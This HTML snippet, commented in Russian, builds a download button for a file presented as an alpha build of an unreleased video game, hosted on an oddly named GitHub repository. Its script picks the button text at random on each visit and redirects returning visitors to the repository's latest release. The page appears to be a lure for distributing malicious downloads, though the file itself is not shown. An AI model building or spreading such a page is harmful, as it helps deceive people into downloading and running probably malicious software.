<a class="cta" id="dl"
   href="https://github.com/dcalderonc29-collab/app-downloadss/releases/download/111/GTAVI_Alpha_Build_Aug14.zip"
   target="_top" rel="noreferrer noopener">Download</a>

<script>
  // случайные подписи — меняются на каждом открытии
  const labels = [
    'Get file', 'Download', 'Get it now', 'Grab build', 'Start download',
    'Fetch ZIP', 'Save file', 'Get package'
  ];
  document.getElementById('dl').textContent =
    labels[Math.floor(Math.random() * labels.length)];

  // если пришли назад с objects.githubusercontent.com — отправим на страницу релиза
  try {
    if (document.referrer && /objects\.githubusercontent\.com/.test(document.referrer)) {
      document.getElementById('dl').href =
        'https://github.com/dcalderonc29-collab/app-downloadss/releases/latest';
    }
  } catch(e){}
</script>
